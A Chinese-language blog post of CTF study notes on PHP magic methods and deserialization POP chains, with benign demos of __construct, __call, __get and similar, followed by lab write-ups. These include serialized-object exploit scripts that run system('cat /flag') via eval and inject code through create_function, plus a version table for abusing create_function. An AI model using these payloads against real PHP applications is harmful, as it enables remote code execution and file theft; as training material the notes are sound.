---
title: "WEB_php反序化和pop链"
image: ''
pinned: false
comment: true
published: 2026-04-02
description: "WEB"
category: WEB
tags: [WEB]
---



![image-20260407200646301](/images/image-20260407200646301.png)

这是由php官方规定的17个魔术方法。

在php反序列化和pop链中的关键方法，通过这些方法我们才能构造出一条一条的攻击链。

这篇文章主要是记录我从单个开始，一步一步熟练掌握魔术方法，以及之后通过各种实战记录思路和攻击链。





### 1.__construct

**构造函数**

当使用 `new` 关键字创建一个类的实例时，PHP 会自动查找并调用该类中的 `__construct()` 方法。

```
class User {
    public $username;
    public $role;

    // 构造函数
    public function __construct($name, $role = '普通用户') {
        $this->username = $name;
        $this->role = $role;
        echo "用户 {$this->username} 已创建，角色为 {$this->role}。\n";
    }
}

// 实例化时传入参数
$user1 = new User("张三"); 
// 输出: 用户 张三 已创建，角色为 普通用户。

$user2 = new User("李四", "管理员"); 
// 输出: 用户 李四 已创建，角色为 管理员。
```

当两个user新建实例User时，`__construct()` 直接被 PHP 查询并调用了，这也就是为什么会有输出的信息，因为 `__construct()` 方法中存在echo的语句。



注：**在使用默认参数时，有默认值的参数必须放在没有默认值的参数后面**。

一个类只能有一个 `__construct` 方法。



### 2.__destruct()

析构函数(**不接收任何参数**)

当一个对象在内存中被销毁时，PHP 会自动调用这个方法。

类似情形：

* **代码执行完毕**：整个 PHP 脚本运行结束时，所有留下的对象都会被自动销毁。

* **变量被主动释放**：如果手动将对象变量设为 `null`，或者使用 `unset($obj)`。

* **变量失去引用**：当一个对象不再被任何变量指向时（比如函数执行结束，函数内部的局部变量被回收）。

```
class FileHandler {
    private $handle;

    public function __construct($filename) {
        $this->handle = fopen($filename, 'w');
        echo "文件已打开。\n";
    }

    // 析构函数：在对象消失时自动关闭文件
    public function __destruct() {
        if ($this->handle) {
            fclose($this->handle);
            echo "文件已安全关闭（由析构函数处理）。\n";
        }
    }
}

$file = new FileHandler('test.txt');
// 假设这里有很多操作...
unset($file); // 手动销毁，立即触发 __destruct
echo "脚本继续执行...\n";
```





## 注：

构造函数和析构函数一样，子类如果定义了自己的函数，不会自动调用父类的函数。

- 如果需要执行父类的逻辑，必须手动调用：`parent::__destruct()`/`parent::__construct()`。



### 3.__call($name, $arguments)

- **`$name`**: 被调用的方法名。
- **`$arguments`**: 调用方法时传入的所有参数，封装在一个**索引数组**中。
- **返回值**: `__call` 的返回值将作为原始方法的调用结果返回给调用者。(就是说虽然我们调用的方法不存在，但同样会有返回值)

当你尝试调用一个类中“**不存在**”或“**不可访问**”的方法时，它就会被自动触发。

```
class Robot {
    // 实际存在的方法
    public function sayHi() {
        echo "你好！\n";
    }

    // 当调用不存在的方法时触发
    public function __call($name, $arguments) {
        echo "你尝试调用了一个不存在的方法：'{$name}'\n";
        echo "传入的参数有：";
        print_r($arguments);
        
        return "我是 __call 的返回值";
    }
}

$bot = new Robot();
$bot->sayHi(); // 正常调用

// 调用一个不存在的方法 'run'
$result = $bot->run("快速", 500); 

echo $result;
```

这边的备注很明显了，实例第一次调用sayhi()方法，所以可以正常输出你好。第二次调用run()方法，但由于没有这个方法就触发了 `__call()` 呼吁i先打印出我们调用了不存在的方法：run() ，然后以索引数组的方式打印出我们传入的参数。最终echo救赎输出 `__call()` 方法中的return值。

![image-20260407204606972](/images/image-20260407204606972.png)

实际以例子为模板写的php可运行代码运行的结果。



### 4.__callStatic($name, $arguments)

**`$name`**: 被调用的静态方法名。

**`$arguments`**: 传入参数的**索引数组**。

在 PHP 中，当调用一个类中**不存在**或**不可访问**的**静态方法**（使用 `::` 语法）时，这个魔术方法就会被自动触发。

```
<?php

class DB {
    // 假设这是我们实际执行查询的逻辑
    private static function runQuery($method, $args) {
        echo "【底层操作】正在执行查询逻辑...\n";
        echo "【动作】: {$method}\n";
        echo "【参数】: " . implode(', ', $args) . "\n";
    }

    // 魔法开始：处理所有静态调用
    public static function __callStatic($name, $arguments) {
        // 比如用户调用 DB::table('users')
        // $name 就是 'table'
        // $arguments 就是 ['users']
        
        self::runQuery($name, $arguments);
        
        // 很多时候这里会返回对象本身以支持链式调用，
        // 但这里为了演示，我们先返回一个确认信息。
        return "查询发送成功！";
    }
}

// 注意这里：类里面根本没有定义 table() 或 where() 方法
$status = DB::table('users', 'id', 1); 

echo "【外部状态】" . $status;
```

这边没有new一下创建实例，是因为**`static`**（静态）方法的特点就是可以直接通过类名调用方法。

说实话在这段代码中其实不论怎么改调用方法都一定触发 `__callStatic()` 因为定义类中，runQuery方法是私有的，外部访问不到的。

注：**与 `__call` 不同，`__callStatic` 必须被声明为 `static`（静态的）。**



### 5.__get($name)

```
public function __get(string $name): mixed
```

* **`$name`**: 你想要读取的那个属性的名字。

* **返回值**: 你返回什么，外部拿到的就是什么。

当尝试访问一个**不存在**或者**没有权限访问**（`private` 或 `protected`）的属性时，PHP 就会自动调用 `__get` 这个方法。

```
<?php

class User {
    private $username = "张三";
    private $score = 95;

    // 当外部尝试读取不可见属性时触发
    public function __get($name) {
        echo "【魔法触发】正在读取属性：'{$name}'\n";

        // 逻辑处理：只允许读取 username，不允许读取 score
        if ($name === 'username') {
            return $this->username;
        }

        return "【警告】该属性禁止访问或不存在！";
    }
}

$user = new User();

// 1. 尝试读取 private 属性 username
echo "用户姓名：" . $user->username . "\n"; 

echo "-----------------\n";

// 2. 尝试读取 private 属性 score
echo "用户分数：" . $user->score . "\n";
```

由于在 `__get()` 里面写好了如果 `$name === 'username'` 可以在内部调用方法得到数据，因此在第一次读取时，可以读取到了username；而在第二次中就没有办法，因为我们访问不到score，`__get()` 方法也没有写，所以读取不到，只会return 警告。



### 6.__set($name, $value)

尝试给一个**不可访问**或**不存在**的属性赋值时，它就会自动触发。

```
<?php

class User {
    private $age;
    private $data = []; // 用来存那些没定义的属性

    public function __set($name, $value) {
        echo "【安检启动】准备给 '{$name}' 赋值为 '{$value}'\n";

        if ($name === 'age') {
            // 逻辑过滤：年龄不能是负数，也不能太大
            if ($value < 0 || $value > 150) {
                echo "【拒绝】年龄不合法，赋值失败！\n";
                return; // 直接拦截，不写进属性
            }
            $this->age = $value; // 合法，写入私有属性
        } else {
            // 如果是其他没定义的属性，统一存进 data 数组里
            $this->data[$name] = $value;
        }
    }

    public function getAge() {
        return $this->age;
    }
}

$user = new User();

// 1. 尝试赋一个非法值
$user->age = -10; 
// 输出：【安检启动】... 【拒绝】...

// 2. 尝试赋一个合法值
$user->age = 25; 
echo "最终年龄：" . $user->getAge() . "\n";

// 3. 赋一个类里根本没写的属性
$user->hobby = "编程"; 
// 这会被存进 $data 数组里
```

这边就是存在当我们想要对一个private属性的变量赋值时，调用 `__set()` 执行赋值命令，而第一次的赋值因为数值不合法被拒绝，第二次赋值数值合法，就成功在外部对类内部的私有属性赋上了值，第三次赋值是对一个没有定义的属性赋值，所以会存入已经写好的数组中。

![image-20260407213553303](/images/image-20260407213553303.png)

运行结果跟分析的一模一样。



### 7.__isset($name)

`isset($user->nickname);`

如果 `nickname` 是私有的，PHP 引擎会自动执行： `$user->__isset("nickname");`	**(自动传参)**

- **`$name`**：同样是 PHP 引擎自动抓取的属性名（字符串 `"nickname"`）。
- **返回值**：你必须返回 `true` 或 `false`。

其实它就是一个检验器，如果存在就 `true` ，不存在就 `false` 。

用真与假来代替访问的返回值。

```
<?php

class User {
    private $data = [
        'username' => '张三',
        'email' => 'zhangsan@example.com'
    ];

    // 当外部对不可见属性调用 isset() 或 empty() 时触发
    public function __isset($name) {
        echo "【查岗】有人在打听属性 '{$name}' 是否存在...\n";

        // 检查这个名字是否在我们的私有数组里
        return isset($this->data[$name]);
    }
}

$user = new User();

// 1. username 是私有的，直接查会返回 false
// 但有了 __isset，它会去问 __isset("username")
if (isset($user->username)) {
    echo "结果：username 属性是存在的！\n";
} else {
    echo "结果：找不到这个属性。\n";
}

echo "-----------------\n";

// 2. 查一个完全不存在的属性
if (isset($user->age)) {
    echo "结果：age 存在。\n";
} else {
    echo "结果：age 不存在。\n";
}
```

注释挺明显的，就是一个查询的作用。

在很多直接源码的题目里，这个函数还挺常见的，用来保证变量存在值。



### 8.__unset($name)

























































































# 反序列化实战：

## 1.

![image-20260407214614653](/images/image-20260407214614653.png)

很简单的一题，定义了一个类，然后将我们传给flag参数的数值反序列化，然后调用action()方法，只要对cat进行赋值，使其变成我们希望执行的命令就行了。

```
<?php  
class a{  
    var $act;  
    function action(){  
        eval($this->act);  
    }  
}  
$exp = new a;  
$exp->act = "system('cat /flag');"; 
echo urlencode(serialize($exp));  
?>
```



## 2.

![image-20260408180657562](/images/image-20260408180657562.png)

这边找了个探姬的本地反序列化靶场做了一下。

2，3关其实反序列化的过程都一样，只是传入的参数不太一样。

一个是直接get传参就行，这一个需要在cookie中传参。

讲一下原理吧。

mylogin中，定义了user和pass，然后后面有一个login()方法，如果这两个参数的数值是题目里面写好的，那么就会login()方法就会返回1，从而满足下面的if前提，然后读出flag。

```
<?php
class mylogin{
    var $user;
    var $pass;
}

$a=new mylogin();
$a->user="daydream";
$a->pass="ok";

echo urlencode(serialize($a));
?>
```



## 3.

![image-20260409180524322](/images/image-20260409180524322.png)

```
<?php
class func {
    public $key;
}

class GetFlag {
    public $code;
    public $action;
}
$b = new GetFlag();
$b->action = "create_function";
$b->code = '} include("flag.php"); echo $flag; //';
$a = new func();
$a->key = serialize(array($b, "get_flag"));

echo urlencode(serialize($a));
?>
```

依旧简单讲解一下，这边是利用了php版本还没更新到后面，而有一个特殊的函数--- `create_function` 的作用类似eval，从而执行了我们的指令。

这个函数具体的作用可以看下面。

总之就是这个函数可以帮我们执行我们想要执行的php命令。

而我们对其预设为 `include("flag.php"); echo $flag;` ，从而得到flag。这段代码就是读取flag.php，输出flag对象。

这便是第一个实例的作用。

而第二个实例的作用就是为了触发第一个实例。

由于源码存在 `__destruct` 这个魔术方法，它的触发方式是当一个对象在内存中被销毁时，PHP 会自动调用这个方法，实际就是当我们脚本运行完时，它就会触发，然后调用方法。

源码中写了一个反序列化$key参数，所以我们将其设置为 `array($b, "get_flag")`，在php中，如果一个数组的结构是 `[对象实例, "方法名"]`，那么 php 就会尝试取调用这个实例的对应方法，这也就是我们用来触发 b实例 getflag方法的原理。



## 4.





















# 常用漏洞函数以及适用版本

## 1.create_function

`create_function('', $code)`

相当于：

```
function __lambda_func() {
    { $code内容 }
}


```

是一个类似eval的架构，只是需要一些简单的闭合操作。

可以用来执行php的代码。

| **PHP 版本**            | **状态**     | **执行行为**                                                 |
| ----------------------- | ------------ | ------------------------------------------------------------ |
| **PHP 4.0.1 - PHP 7.1** | **正常使用** | 函数运行良好，不会有任何警告。这是该漏洞最容易利用的时期。   |
| **PHP 7.2 - PHP 7.4**   | **已弃用 **  | 代码仍然可以执行，但 PHP 会抛出一个 `Deprecated` 级别的警告。 |
| **PHP 8.0 及以上**      | **已移除 **  | 调用它会直接触发 Fatal error，提示函数不存在。               |









---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
